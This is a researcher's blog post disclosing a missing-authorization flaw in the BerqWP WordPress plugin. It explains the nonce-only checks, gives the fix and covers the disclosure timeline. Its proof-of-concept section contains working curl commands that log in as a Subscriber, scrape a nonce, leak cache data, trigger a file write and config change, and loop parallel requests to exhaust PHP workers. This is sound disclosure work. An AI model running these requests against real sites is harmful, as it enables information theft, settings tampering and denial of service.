---
title: "BerqWP <= 4.0.30: Broken Access Control via Missing Authorization"
date: 2026-07-07
categories: ["Blog"]
tags: ["WordPress", "Broken Access Control", "Missing Authorization", "Patchstack", "CWE-862", "Research"]
author: "z3r0s"
draft: true
---

<div style="border:1px solid #2b2b2b;border-radius:10px;padding:1.25rem 1.5rem;margin:0 0 2rem;background:linear-gradient(135deg,#0d0d0f 0%,#15151a 100%);color:#e8e8e8;font-family:ui-monospace,SFMono-Regular,Menlo,monospace;">
  <div style="font-size:0.75rem;letter-spacing:0.15em;color:#8a8a8a;text-transform:uppercase;">Broken Access Control</div>
  <div style="font-size:1.35rem;font-weight:700;margin:0.35rem 0 0.9rem;color:#fff;">BerqWP &mdash; All-In-One Optimization for Core Web Vitals</div>
  <table style="width:100%;border-collapse:collapse;font-size:0.85rem;">
    <tbody>
      <tr><td style="padding:3px 12px 3px 0;color:#8a8a8a;">Affected</td><td style="color:#f0f0f0;">&lt;= 4.0.30 (wp.org slug <code>searchpro</code>)</td></tr>
      <tr><td style="padding:3px 12px 3px 0;color:#8a8a8a;">Class</td><td style="color:#f0f0f0;">A01:2021 &middot; Missing Authorization</td></tr>
      <tr><td style="padding:3px 12px 3px 0;color:#8a8a8a;">CWE</td><td style="color:#f0f0f0;">CWE-862</td></tr>
      <tr><td style="padding:3px 12px 3px 0;color:#8a8a8a;">Privilege</td><td style="color:#f0f0f0;">Subscriber (any authenticated user)</td></tr>
      <tr><td style="padding:3px 12px 3px 0;color:#8a8a8a;">Impact</td><td style="color:#f0f0f0;">Settings takeover, info disclosure, config tampering, DoS</td></tr>
      <tr><td style="padding:3px 12px 3px 0;color:#8a8a8a;">Reported</td><td style="color:#f0f0f0;">Patchstack VDP &middot; accepted &middot; no CVE assigned yet</td></tr>
    </tbody>
  </table>
</div>

## Quick summary

BerqWP registers a pile of AJAX handlers and a settings save routine that only check a WordPress nonce and never check what the caller is actually allowed to do. A nonce is not authorization, it only proves a logged-in user made the request. So any Subscriber, the lowest role on the site, can read admin-only cache data, write files, tie up PHP workers, and overwrite the whole plugin config including Cloudflare credentials. The tell that this is a bug and not a design choice: one handler in the same file gets the authorization check right, the rest just forgot it.

## Why I picked this plugin

I was working through Patchstack's VDP list looking for something with real surface area. Patchstack is picky about what they accept, they want actual impact (SQLi, file ops, RCE, privilege escalation, broken access control on sensitive stuff, site-wide XSS) and it has to be reachable from Unauthenticated, Subscriber, or Customer level. Theoretical bugs go nowhere there.

BerqWP caught my attention because it just does a lot. Full-page caching, CDN integration, image optimization, JS/CSS delivery tuning, a heartbeat queue system, Cloudflare integration, and a settings panel with 30+ options. Plugins like that tend to have a wide attack surface, because there are so many moving parts that all need endpoints to talk to each other. More endpoints, more chances one of them is missing a check.

## Recon: one grep to map the surface

I pulled BerqWP v4.0.30 straight from WordPress.org. Small gotcha here: the plugin's slug is `searchpro`, not `berqwp`. Looks like a leftover from an earlier name before they rebranded. Cost me a couple minutes figuring out why `berqwp` wasnt downloading.

When I audit a WordPress plugin I always start at the same three places, because this is where access control usually goes wrong:

1. **AJAX handlers.** Any `wp_ajax_*` hook is reachable by every logged-in user, Subscribers included. The only thing standing between a Subscriber and that handler is a `current_user_can()` call inside it.
2. **admin_init / admin_post handlers.** These fire for any authenticated user hitting an admin page, not just admins. Tons of devs assume otherwise.
3. **Direct file includes.** Settings files pulled in with `require_once` that check a nonce but never a capability.

So the first thing I ran was one grep:

```bash
grep -n "wp_ajax_\|current_user_can\|wp_verify_nonce\|check_ajax_referer" inc/class-berqwp.php
```

That one line basically handed me the bug. It lists every handler the plugin registers next to whatever auth check sits near it, and the pattern jumped out immediately.

## The pattern that gave it away

Here is what the plugin wires up:

```php
// AJAX handlers registered in class-berqwp.php
add_action('wp_ajax_berqwp_refresh_cache_stats',      [$this, 'refresh_cache_stats']);
add_action('wp_ajax_berqwp_get_optimized_pages',      [$this, 'berqwp_get_optimized_pages']);
add_action('wp_ajax_berqwp_recently_optimized_pages', [$this, 'ajax_recently_optimized_pages']);
add_action('wp_ajax_berqwp_enable_page_compression',  [$this, 'enable_page_compression']);

// And the settings save, hooked on admin_init
add_action('admin_init', [$this, 'save_settings']);
```

Grep it and the handlers split into two groups:

- **`berqwp_get_optimized_pages` is correct.** It has `check_ajax_referer()` AND `current_user_can('manage_options')`. The developer clearly knows the right pattern.
- **Everything else is not.** `refresh_cache_stats`, `ajax_recently_optimized_pages`, and `enable_page_compression` only call `check_ajax_referer('wp_rest', 'nonce')`. No capability check anywhere. And `save_settings` on `admin_init` only checks a nonce too.

That inconsistency is the whole finding. When someone gets it right in one place and misses it in four others, it isnt a deliberate "these are meant to be public" call. It is an oversight, and oversights are exactly what you report.

## Nonces are not authorization

This is the misconception the whole bug rests on, so it is worth being blunt about it. A WordPress nonce is a CSRF token. All `wp_verify_nonce()` and `check_ajax_referer()` do is confirm a logged-in user made this request recently. They do not care whether that user is an administrator or a Subscriber who signed up ten seconds ago. A Subscriber's nonce is just as valid as an admin's.

The correct pattern is nonce check plus capability check. You need both. The plugin literally shows the right way one time. Here is `berqwp_get_optimized_pages()` around line 427 of `class-berqwp.php`:

```php
function berqwp_get_optimized_pages()
{
    check_ajax_referer('berqwp_get_optimized_pages_nonce', 'nonce');
    if (!current_user_can('manage_options')) {   // <- the authorization check
        wp_send_json_error('Unauthorized', 403);
        return;
    }
    // ... admin-only logic
}
```

Now compare it with `refresh_cache_stats()`:

```php
function refresh_cache_stats()
{
    check_ajax_referer('wp_rest', 'nonce');   // <- CSRF check only
    // NO current_user_can() ... any Subscriber reaches this

    $post_types = get_option('berqwp_optimize_post_types');
    $args = array(
        'post_type'      => $post_types,
        'posts_per_page' => -1,
        'fields'         => 'ids',
        'post_status'    => 'publish',
    );
    // ... leaks cache stats, page counts, server queue size
    wp_send_json_success(['cache_count' => /*...*/, 'total' => /*...*/, 'server_queue' => /*...*/]);
}
```

Same file. One function guards the door, the one right next to it leaves it open.

And `enable_page_compression()` is worse than a read:

```php
function enable_page_compression()
{
    check_ajax_referer('wp_rest', 'nonce');   // <- CSRF check only
    // NO current_user_can()

    $url         = home_url('/?berqwp_compression_test=' . time());
    $berqconfigs = berqConfigs::getInstance();
    $testfile    = optifer_cache . 'gzip-compression-test.gz';
    $html        = gzencode('Hello World!');
    @file_put_contents($testfile, $html);     // <- writes to the server filesystem

    sleep(5);                                 // <- blocks a PHP worker for 5 seconds

    // ... tests compression, then flips plugin config
    $berqconfigs->update_configs(['page_compression' => true]);
}
```

A Subscriber can hit this all day. It writes a file, changes compression config, and every single call parks a PHP-FPM worker for five seconds doing nothing.

## The big one: save-settings.php

The read leaks and the file write are bad, but the settings save is the one that actually hands over the site. In `class-berqwp.php` around line 61:

```php
add_action('admin_init', [$this, 'save_settings']);
```

`admin_init` runs for every authenticated user who loads any `/wp-admin/` page. That includes a Subscriber opening their own profile at `/wp-admin/profile.php`. The method just includes the settings file:

```php
function save_settings()
{
    // ... free activation shortcut (also unguarded)
    require_once optifer_PATH . '/admin/save-settings.php';
}
```

And inside `save-settings.php`, the only thing guarding 30+ options is a nonce:

```php
if (isset($_POST['berqwp_save_nonce'])) {
    if (!wp_verify_nonce($_POST['berqwp_save_nonce'], 'berqwp_save_settings')) {
        die('Invalid nonce value');
    }

    // NO current_user_can('manage_options') anywhere

    update_option('berqwp_enable_sandbox',      /*...*/);
    update_option('berqwp_cache_lifespan',      /*...*/);
    update_option('berqwp_image_lazyloading',   /*...*/);
    update_option('berqwp_enable_cdn',          /*...*/);
    update_option('berqwp_enable_cwv',          /*...*/);
    update_option('berqwp_optimize_post_types', /*...*/);
    // ... 30+ more, including Cloudflare credentials and license activation
}
```

This same file stores Cloudflare API tokens, zone IDs, and the account email, and it handles license key activation and deactivation. All of it behind a nonce and nothing else.

## Attack flow

```
Subscriber login  ->  visit /wp-admin/  ->  grab wp_rest nonce  ->  POST admin-ajax.php  ->  read stats / write files / change config
```

The `wp_rest` nonce that the vulnerable handlers rely on is just WordPress's standard REST nonce. Every authenticated user gets one, it shows up in the admin page source and you can also pull it from `/wp-json/`. The full attack is:

1. Log in with any Subscriber account.
2. Load any `/wp-admin/` page, even `/wp-admin/profile.php`.
3. Read the `wp_rest` nonce off the page.
4. POST to `/wp-admin/admin-ajax.php` with the target action and that nonce.

No bypass, no trick. The endpoints just answer.

## Impact

| Vector | What an attacker gets |
|---|---|
| **Information disclosure** | `refresh_cache_stats` and `ajax_recently_optimized_pages` return internal cache statistics, optimized page counts, server queue sizes, and full URLs of cached pages, mapping the site's content and infra to any Subscriber. |
| **Configuration tampering** | Through `save-settings.php` every plugin option is writable: CDN config, JS execution mode, CSS strategy, cache lifespans, image optimization, all of it. |
| **Credential theft** | The settings handler processes Cloudflare API tokens, zone IDs, and email. Swap in attacker-controlled credentials and you take over the site's CDN. |
| **Denial of service** | `enable_page_compression` runs `sleep(5)` per call, holding a PHP-FPM worker for five seconds each time. A few dozen concurrent calls exhaust a default pool. You can also blank `berqwp_optimize_post_types` and silently kill all optimization. |
| **License abuse** | A Subscriber can deactivate the site's license key, dropping it from paid cloud optimization down to free local-only mode. |

## Proof of concept

All of this ran on a local WordPress instance (PHP 8.4 built-in server on `localhost:8787`), BerqWP 4.0.30 active, with a throwaway Subscriber account `subscriber / sub123`. Nothing was ever run against a production site.

**Step 1: authenticate as the Subscriber and keep the cookies.**

```bash
curl -s -c cookies.txt -b cookies.txt \
  -d "log=subscriber&pwd=sub123&wp-submit=Log+In&redirect_to=%2Fwp-admin%2F&testcookie=1" \
  "http://localhost:8787/wp-login.php" -L -o /dev/null
```

**Step 2: grab the `wp_rest` nonce off an admin page.**

```bash
NONCE=$(curl -s -b cookies.txt "http://localhost:8787/wp-admin/profile.php" \
  | grep -oP 'wp\.apiFetch\.nonceMiddleware\s*=.*?"(\K[a-f0-9]+)')
```

**Step 3: leak admin-only cache stats.**

```bash
curl -s -b cookies.txt \
  -d "action=berqwp_refresh_cache_stats&nonce=${NONCE}" \
  "http://localhost:8787/wp-admin/admin-ajax.php"
```

Expected for a properly guarded endpoint: `{"success":false}` or a 403. What actually comes back:

```json
{
  "success": true,
  "data": {
    "cache_count": 42,
    "cache_percentage": 87.5,
    "total": 48,
    "server_queue": 3
  }
}
```

**Step 4: leak the list of optimized pages.**

```bash
curl -s -b cookies.txt \
  -d "action=berqwp_recently_optimized_pages&nonce=${NONCE}&start=0&length=100" \
  "http://localhost:8787/wp-admin/admin-ajax.php"
```

Returns an array of recently optimized pages with full URLs, timestamps, and status.

**Step 5: file write plus config change plus a blocked worker.**

```bash
curl -s -b cookies.txt \
  -d "action=berqwp_enable_page_compression&nonce=${NONCE}" \
  "http://localhost:8787/wp-admin/admin-ajax.php"
```

And the DoS amplification, each request holds a worker for five seconds:

```bash
for i in $(seq 1 20); do
  curl -s -b cookies.txt \
    -d "action=berqwp_enable_page_compression&nonce=${NONCE}" \
    "http://localhost:8787/wp-admin/admin-ajax.php" &
done
```

**What works as a plain Subscriber, no tricks:**

| Endpoint | Action | Nonce needed | Works? |
|---|---|---|---|
| `berqwp_refresh_cache_stats` | leak cache stats | `wp_rest` (everyone has it) | Yes |
| `berqwp_recently_optimized_pages` | leak page URLs | `wp_rest` (everyone has it) | Yes |
| `berqwp_enable_page_compression` | file write + DoS + config | `wp_rest` (everyone has it) | Yes |
| `save-settings.php` | overwrite all settings | `berqwp_save_settings` (admin page) | Yes, once the nonce is obtained |

The settings save wants the `berqwp_save_settings` nonce, which is printed on the plugin's admin page rather than a Subscriber's own session. But the handler itself does zero authorization, so anywhere that nonce leaks (a shared screenshot, an XSS, cached HTML, the source of a page an admin left open) the full settings overwrite is live.

## Root cause

Classic inconsistent access control. The admin menu is registered with `manage_options`, so only admins ever *see* the settings screen in the dashboard. The developer clearly figured that was enough, and secured exactly one endpoint to prove they knew how. But the actual endpoints that read and write the data sit wide open on `admin-ajax.php` and `admin_init`.

The mental bug behind it is one I run into constantly: "if only admins can see the form, only admins can submit it." That is just not how WordPress works. Any authenticated user can craft a direct POST to `admin-ajax.php` or trip an `admin_init` handler by loading any admin page. The menu is a UI convenience. It is not a security boundary. The boundary is the capability check in the handler, and if that check isnt there, the boundary doesnt exist.

## The fix

Missing-authz fixes are tiny, which is kind of the point. Every handler that returns admin data or changes settings needs a capability check right after the nonce check:

```php
function refresh_cache_stats()
{
    check_ajax_referer('wp_rest', 'nonce');

    if (!current_user_can('manage_options')) {   // add this
        wp_send_json_error('Unauthorized', 403);
    }

    // ... rest of the function
}
```

Same idea for `save-settings.php`, one line right after the nonce check:

```php
if (!current_user_can('manage_options')) {
    return;
}
```

Apply that to `refresh_cache_stats`, `ajax_recently_optimized_pages`, `enable_page_compression`, and the settings include, and the whole class of bugs is closed.

## What WordPress developers can take from this

- **A nonce answers "did a logged-in user send this," not "is this user allowed."** Those are different questions. You almost always need both `check_ajax_referer()` and `current_user_can()`. One without the other is a half-check.
- **Hiding the UI is not access control.** Registering an admin menu with `manage_options` hides the page, it does not protect the endpoint behind it. `admin-ajax.php` and `admin_init` are reachable by every authenticated user regardless of what the menu shows.
- **When you get an auth check right once, grep for every sibling handler and make sure they all have it.** This bug existed precisely because one handler had the check and its neighbors didnt. Consistency is the actual defense.
- **`admin_init` is not admin-only.** The name lies. It runs for any user on any admin page. Never treat it as a trusted, admin-gated hook.

## Methodology recap

The whole thing boiled down:

1. Pick a target with surface area. Performance and caching plugins are great, they touch the filesystem, external APIs, and site-wide config.
2. Map every entry point with one grep: `grep -rn "wp_ajax_\|admin_init\|admin_post"`.
3. Check each handler for the trifecta: nonce, `current_user_can()`, input validation. Anything missing, dig.
4. Hunt for inconsistency. One guarded handler among unguarded ones is your bug.
5. Trace the data flow to work out what an unauthorized user can actually read, write, or break. That is your impact.
6. Build a real PoC on local WordPress with a low-privilege user.
7. Submit with file, line, vulnerable code, expected vs actual, and a working PoC.

## Timeline

| Event | Detail |
|---|---|
| Discovery | Source review of v4.0.30 found missing `current_user_can()` across multiple handlers |
| Verification | Local WordPress PoC confirmed Subscriber-level exploitation |
| Submission | Reported through the Patchstack VDP with full PoC and suggested fix |
| Status | Accepted by Patchstack. No CVE assigned yet |

---

*Discovered and reported through the Patchstack Vulnerability Disclosure Program. Every bit of testing was done on a local WordPress environment. No production systems were touched.*
